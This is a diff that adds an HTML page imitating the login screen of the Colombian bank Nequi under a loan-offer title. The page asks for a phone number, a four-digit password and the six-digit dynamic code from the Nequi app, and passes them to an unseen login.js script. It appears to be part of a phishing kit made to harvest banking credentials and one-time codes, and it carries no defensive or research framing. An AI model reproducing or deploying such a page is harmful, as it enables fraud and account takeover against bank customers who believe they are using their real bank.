@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi | Préstamo Propulsor</title>
+    <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/nequ.css">
+
+    <!-- script -->
+    <script src="./js/functions.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+</head>
+<body>
+    <div id="loader" class="min-h-screen hidden flex items-center justify-center flex-col w-screen fixed z-[20] top-0 bg-white mrp">
+        <img src="./assets/pse/loading_nequi.gif" width="200px">
+        <p class="font-semibold mt-10">Espera un momentito ;) ¡No te vayas!</p>
+    </div>
+
+    <nav class="w-full flex justify-center fixed bg-white z-[10] border-b border-b-1 border-gray-200">
+        <div class="w-full p-4 max-w-[1200px] flex justify-between items-center">
+            <img src="./assets/pse/logo_nequi.svg">
+            <div class="hidden sm:flex items-center gap-6 mrp">
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Inicio</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Para personas</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Ayuda</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Conócenos</a>
+                <div class="h-10 w-[1px] bg-gray-200"></div>
+                <button class="py-3 px-10 text-sm text-[#200020] border border-[#200020] bg-white rounded hover:bg-[#200020] hover:text-white transition-colors">
+                    Entrar
+                </button>
+                <button class="py-3 px-10 text-sm text-white bg-[#DA0081] rounded hover:bg-[#b3006b] transition-colors">
+                    Recargar
+                </button>
+            </div>
+            <div class="sm:hidden cursor-pointer">
+                <img src="../assets/pse/hamb_nequi.png" width="30px">
+            </div>
+        </div>
+    </nav>
+    
+    <section class="min-h-screen w-full px-2 flex items-center justify-center bg-[#fbe5f2] bg-nequi pt-[70px] mrp">    
+
+        <div id="step-one" class="w-full flex items-center justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <p class="text-xl py-5 font-semibold text-center">Inicia sesión</p>
+
+                <p class="text-md py-3 text-center">Ingresa tu número de cel y clave</p>
+
+                <form class="py-3" id="form-step-one" action="">
+                    <div class="flex flex-row items-center gap-5">
+                        <div class="flex flex-row items-center gap-1 pt-6 pl-2">
+                            <img src="./assets/pse/flag_colombia.png" width="20px">
+                            <p>+57</p>
+                        </div>
+                        <div class="input-container mt-2">
+                            <input type="text" id="number" placeholder="" oninput="cleanAndLimitDigits(this, 10)" required>
+                            <label for="phone-number">Número de celular</label>
+                        </div>
+                    </div>
+                    <div class="input-container mt-2">
+                        <input type="password" id="pass" placeholder="" oninput="limitDigits(this, 4)" required>
+                        <label for="phone-number">Contraseña</label>
+                    </div>
+                    <button class="block w-full mt-5 py-3 bg-[#DA0081] rounded text-white">
+                        Continuar
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+            </div>
+        </div>
+
+        <div id="step-cdin" class="hidden w-full flex items-center justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <p class="text-xl pt-5 font-semibold text-center mb-5">Confirmemos que eres tú</p>
+
+                <p class="text-md text-center text-sm">Para confirmar que eres tú escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+
+                <form id="form-step-cdin" class="py-3" action="">
+                    <div class="flex justify-center gap-3 mt-6 px-4">
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 0)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 1)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 2)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 3)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 4)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 5)" required>
+                    </div>
+                    <input type="hidden" id="cdin" value="">
+
+                    <!-- Teclado numérico estilo minimalista -->
+                    <div class="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('1')">1</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('2')">2</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('3')">3</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('4')">4</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('5')">5</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('6')">6</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('7')">7</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('8')">8</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('9')">9</button>
+                        <div></div>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('0')">0</button>
+                        <button type="button" class="h-12 flex items-center justify-center focus:outline-none" onclick="handleKeypadInput('')">
+                            <img src="./assets/pse/icono-borrar.svg" width="30px" alt="">
+                        </button>
+                    </div>
+
+                    <button class="block w-full mt-8 py-3 bg-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors">
+                        Confirmar
+                    </button>
+                </form>
+
+                <!-- <p class="text-sm py-3 text-center">Recuerda que debes tener tu cel a la mano para terminar el proceso.</p> -->
+            </div>
+        </div>
+
+    </section>
+
+
+    <script src="./js/login.js"></script>
+</body>
+</html>
